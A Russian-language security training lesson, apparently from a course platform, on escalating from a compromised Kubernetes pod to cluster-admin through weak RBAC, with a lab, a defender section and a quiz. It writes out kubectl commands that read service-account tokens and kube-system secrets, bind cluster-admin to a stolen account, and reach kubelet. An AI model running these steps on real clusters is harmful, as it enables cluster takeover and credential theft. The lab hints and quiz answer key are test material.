---
id: cloud-kubernetes-rbac
title: "Kubernetes: RBAC, service-account токены и побег из пода"
category: cloud
parent: cloud-containers-docker
difficulty: hard
order: 3
tags: [cloud, kubernetes, k8s, rbac, serviceaccount, escape, secrets]
prerequisites: [cloud-containers-docker, cloud-iam-basics]
useful_for:
  - "Атака Kubernetes-кластеров через слабый RBAC"
  - "Захват service-account токенов и эскалация"
  - "CTF и пентест облачных оркестраторов"
estimated_minutes: 55
summary: "Kubernetes — control plane облачных ворклоадов. Разбираем API server, kubeconfig, RBAC, service-account токены, аудит прав и классические атаки: privileged pod, hostPath, кража секретов и побег на ноду."
lab:
  kind: shell
  title: "Практика: RBAC — из пода в cluster-admin"
  toolset: [core, kubectl]
  workdir: /home/student/k8s
  files: [task.md, notes.md, serviceaccount/token, serviceaccount/namespace, serviceaccount/ca.crt]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Вспомни из `cloud-containers-docker`: у контейнера есть свой сервисный аккаунт — «паспорт» процесса. Прежде чем расти в правах, выясни, что тебе вообще разрешено: `kubectl auth can-i --list`."
    - "Выясни свои права: `kubectl auth can-i --list`."
    - "Перечисли секреты во всех namespace: `kubectl get secrets -A`."
    - "Прочитай чужой токен: `kubectl get secret ci-deployer-token -n kube-system -o jsonpath='{.data.token}'`."
    - "Найди секрет с флагом и декодируй: `kubectl get secret cluster-admin-token -n kube-system -o jsonpath='{.data.token}' | base64 -d > found.txt`."
---

## Задача

В прошлом уроке мы вышли из пода на ноду. Но часто нода — не цель, а промежуточная станция: настоящая власть в Kubernetes лежит в **API-сервере** — единой точке управления кластером. Ты попал в под, у тебя есть токен, но ты не админ. Вопрос урока: **как из «рядового» пода понять свои права и дорасти до cluster-admin**, используя только RBAC.

## Данные, с которыми работаем

Наш объект — под `web-7f9c-abc`, в который мы зашли через RCE в приложении. Внутри любого пода Kubernetes лежит **service account token** — токен «сервисной учётки» пода, по которому кластер понимает, кто ты и что тебе можно. Он смонтирован по стандартному пути:

```bash
$ ls /var/run/secrets/kubernetes.io/serviceaccount/
ca.crt  namespace  token
$ cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
default
```

Токен — это JWT, длинная строка. Он аутентифицирует нас перед API-сервером. Сам API-сервер доступен внутри кластера по DNS-имени `kubernetes.default.svc`. Сразу сохраняем всё в переменные:

```bash
$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
$ NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
$ APISERVER=https://kubernetes.default.svc
```

## Пробуем в лоб: кто я и что могу

**RBAC** (Role-Based Access Control) — механизм прав Kubernetes: он связывает субъекта (User/Group/ServiceAccount) с ролью, а роль — с правилами «verb × resource». Нам важно не выучить всю систему, а узнать **свои** права.

Если в поде есть `kubectl`, это одна команда:

```bash
$ kubectl auth can-i --list
Resources                                       Non-Resource URLs   Resource Names   Verbs
pods                                            []                  []               [get list]
pods/exec                                       []                  []               [create]
secrets                                         []                  []               [get]
...
```

Читается так: нам можно `get/list` поды, `create` в `pods/exec` (то есть делать `kubectl exec` в поды — выполнять в них команды) и `get` секреты. Прав на создание подов пока не видно — проверим отдельные:

```bash
$ kubectl auth can-i create pods
no
$ kubectl auth can-i get secrets --all-namespaces
yes
```

Мы можем читать секреты **во всех** namespace. Это уже почти победа: секреты кластера — это токены других service account'ов, пароли БД, ключи. Смотрим, что есть:

```bash
$ kubectl get secrets -A
NAMESPACE     NAME                  TYPE
default       app-db                Opaque
kube-system   ci-deployer-token     kubernetes.io/service-account-token
```

Секрет `ci-deployer-token` — токен service account `ci-deployer`. Если у него прав больше, чем у нас, мы можем **примерить его личность**.

## Шаг 2: читаем чужой токен и повышаем права

Токен из секрета — это base64. Достаём его напрямую из объекта:

```bash
$ kubectl get secret ci-deployer-token -n kube-system -o jsonpath='{.data.token}' | base64 -d
eyJhbGciOiJSUzI1NiIsImtpZCI6...
```

Теперь проверяем, что умеет `ci-deployer`:

```bash
$ kubectl auth can-i --list --token="$TOKEN2"
Resources       ...   Verbs
clusterrolebindings ... [create]
pods            ...   [create]
secrets         ...   [get list]
```

Строка `clusterrolebindings ... [create]` — это ключ. Право **создавать clusterrolebindings** означает: можно привязать любую роль, включая `cluster-admin`, к кому угодно — в том числе к себе. `ClusterRoleBinding` — глобальная привязка роли к субъекту.

```bash
$ kubectl --token="$TOKEN2" create clusterrolebinding pwn \
    --clusterrole=cluster-admin \
    --serviceaccount=kube-system:ci-deployer
clusterrolebinding.rbac.authorization.k8s.io/pwn created
```

Одна команда — и `ci-deployer` теперь cluster-admin. Проверяем:

```bash
$ kubectl --token="$TOKEN2" auth can-i '*' '*' --all-namespaces
yes
```

Мы администратор кластера. Дальше — все секреты всех namespace, создание любых подов (в том числе привилегированных — см. прошлый урок), доступ к нодам.

## Полный прогон от начала до конца

1. Зашли в под, забрали SA-токен из `/var/run/secrets/.../token`.
2. `auth can-i --list` → нашли `get secrets`.
3. `get secrets -A` → нашли токен `ci-deployer` в `kube-system`.
4. Проверили права `ci-deployer` → есть `create clusterrolebindings`.
5. Привязали `cluster-admin` к `ci-deployer` → стали админом.
6. Прочитали все секреты и убедились в полном контроле.

Путь от «случайного пода» до «владельца кластера» — четыре команды, и ни одного эксплойта. Слабый RBAC опасен именно этим.

## Если не сработало: другие опасные права

Не обязательно `clusterrolebindings`. Вот на что смотреть в выводе `can-i --list`:

| Право | Что даёт |
|-------|----------|
| `create pods` | запустить привилегированный под → побег на ноду |
| `create pods/exec` | `exec` в чужой под = выполнение команд |
| `get secrets` | токены SA, пароли, ключи |
| `create clusterrolebindings` | выдать себе `cluster-admin` |
| `impersonate` | действовать от имени другого субъекта |
| `nodes/proxy` | прокси к kubelet → `exec` на ноде |

**kubelet** (`:10250`) — агент на каждой ноде. Если через `nodes/proxy` или напрямую дотянуться до него, можно выполнять команды в подах мимо API-сервера:

```bash
$ kubectl get --raw "/api/v1/nodes/node-prod-01/proxy/pods"
{"kind":"PodList", ...}
```

Если RBAC закрыт, а `kubectl` не установлен — ищи **kubeconfig** в файловой системе (`~/.kube/config`, `$KUBECONFIG`, `/etc/kubernetes/admin.conf`). Часто он содержит `cluster-admin`.

## Частые ошибки и подводные камни

- **Считать, что без `kubeconfig` доступа нет.** SA-токен пода сам по себе аутентифицирует нас перед API-сервером — `kubectl` не обязателен, REST-запрос с `Authorization: Bearer` работает так же.
- **Проверять только свой namespace.** Права и секреты часто лежат в `kube-system`; флаг `--all-namespaces` в `auth can-i` показывает реальную картину.
- **Считать SA-токен статичным.** В кластерах с проекцией токен живёт около часа — надо успеть воспользоваться им до истечения.
- **Путать `get` и `list`.** `list secrets` и `get secret` — разные права; иногда есть только одно из них, и это меняет тактику.
- **Забывать про `impersonate`.** Право действовать от имени другого субъекта позволяет «примерить» более привилегированный SA без кражи его токена.

## Что мы теперь знаем

- В каждом поде лежит SA-токен по пути `/var/run/secrets/kubernetes.io/serviceaccount/token`.
- RBAC связывает субъект → роль → правила «verb × resource».
- `kubectl auth can-i --list` — первая команда после входа: показывает свои права.
- `get secrets` ведёт к чужим токенам; `create clusterrolebindings` — прямой путь в `cluster-admin`.
- `nodes/proxy` и открытый kubelet (10250) обходят API-сервер.
- В новых кластерах SA-токен — projected, с TTL около часа: надо успеть.

## На что смотреть дальше

- **k8s-secrets** и **etcd**: где на самом деле хранятся секреты кластера.
- **k8s-admission**: admission-контроллеры, которые могут блокировать создание привилегированных подов.
- **Pod Security Admission**: уровни restricted и как их обходить.

## Глазами защитника

RBAC защищают принципом наименьших привилегий: избегать `cluster-admin`, `*` в verbs и resources, wildcard в groups. Опасные права — `create pods`, `pods/exec`, `create clusterrolebindings`, `escalate`, `bind`, чтение secrets. Включают audit-логи, ревьюят ClusterRoleBindings, используют инструменты (rbac-tool, kubectl-who-can). Помнят, что право менять SA и роли — путь к эскалации.

## Частые вопросы

**Что такое RBAC в Kubernetes?**

Role и ClusterRole (что можно) и RoleBinding и ClusterRoleBinding (кому). Права на действия над ресурсами в namespace или кластере.

**Какие права самые опасные?**

`create pods`, `pods/exec`, `create serviceaccounts`, `escalate`, `bind`, `impersonate`, чтение secrets, `create clusterrolebindings`.

**Как понять свои права?**

`kubectl auth can-i --list`, затем перебор важных действий; инструменты вроде `rbac-tool` строят карту.

**Как из `create pods` получить root?**

Создать под с привилегиями или монтированием хоста; либо под, читающий секреты или использующий мощную SA.

**Что даёт чтение чужого токена?**

Права SA, которой он принадлежит. Если это мощная SA — прямая эскалация.

**Что такое `impersonate`?**

Право действовать от имени другого пользователя или группы. Фактически даёт его права без кражи токена.

**Как защититься?**

Минимальные роли, ревью bindings, запрет wildcard, audit, инструменты контроля RBAC.

**Помогает ли namespace-изоляция?**

Частично: ClusterRoleBindings действуют на весь кластер, поэтому проверяй и их, а не только namespace-роли.

## Разбор: от токена к cluster-admin

В поде атакующий читает service-account токен и проверяет права: `kubectl auth can-i --list`. Видит `create pods` и `get secrets`. Он создаёт под с привилегированной SA, монтирует корень хоста и захватывает узел, откуда читает kubelet-креды и становится cluster-admin. Даже без побега чтение secrets даёт ценные данные. Защита — не выдавать `create pods` и `get secrets` вместе и ревьюить bindings.

## Что чаще всего упускают

ClusterRoleBindings: они действуют на весь кластер, и namespace-изоляция их не ограничивает. Второе — неочевидные опасные права (`escalate`, `bind`, `impersonate`), которые не выглядят как доступ к данным. Третье — сервисные аккаунты по умолчанию: у них могут быть лишние роли. Вывод: ревьюй bindings целиком и проверяй косвенные права, а не только `get secrets`.

**Как проверить права другого SA?**

`kubectl auth can-i --as=system:serviceaccount:ns:name ...` при наличии `impersonate`, иначе — по bindings.

**Что такое default SA?**

Автоматически создаваемый service account namespace; у него могут быть лишние права, если их выдали по ошибке.

## Квиз

Проверь себя.

```quiz
- question: "Где внутри пода лежит токен service account?"
  options:
    - "/var/run/secrets/kubernetes.io/serviceaccount/token"
    - "/etc/passwd"
    - "/root/.kube/token"
    - "/proc/token"
  answer: 0
  explanation: "Это стандартный путь projected-токена SA."
- question: "Какое RBAC-право позволяет читать чужие секреты?"
  options:
    - "get secrets"
    - "list pods"
    - "watch nodes"
    - "create events"
  answer: 0
  explanation: "get secrets даёт доступ к объектам Secret."
- question: "Почему право create clusterrolebindings критично?"
  options:
    - "Позволяет привязать cluster-admin к любому субъекту, включая себя"
    - "Ускоряет планирование подов"
    - "Шифрует секреты"
    - "Только для чтения ролей"
  answer: 0
  explanation: "ClusterRoleBinding привязывает роль к субъекту глобально."
- question: "Что такое kubelet и на каком порту он обычно слушает?"
  options:
    - "Агент ноды, порт 10250"
    - "Балансировщик, порт 80"
    - "DNS, порт 53"
    - "etcd, порт 2379"
  answer: 0
  explanation: "kubelet слушает 10250 и умеет exec в поды."
- question: "Как быстро узнать свои права в кластере?"
  options:
    - "kubectl auth can-i --list"
    - "kubectl delete all --all"
    - "cat /etc/hosts"
    - "kubectl version"
  answer: 0
  explanation: "SelfSubjectAccessReview показывает разрешённые действия."
```

## Куда дальше

В следующем уроке мы разберём, где кластер на самом деле хранит секреты — в `Secret`-объектах, в SA-токенах и в **etcd**. А пока главное запомни: **в Kubernetes власть даёт не эксплойт, а права**; `can-i --list` и один неосторожный `clusterrolebinding` весят больше, чем любая CVE.

## Где пригодится

- **Пентест облаков/оркестраторов:** путь от пода до ноды и cluster-admin.
- **CTF:** k8s-задачи с SA-токенами и escape.
- **Red team:** персистентность и lateral movement внутри кластера.
- **Blue team:** понимание, какие RBAC-права и audit-события критичны.
- **Дальше по дереву:** `cloud-kubernetes-escape`, `cloud-k8s-secrets`.
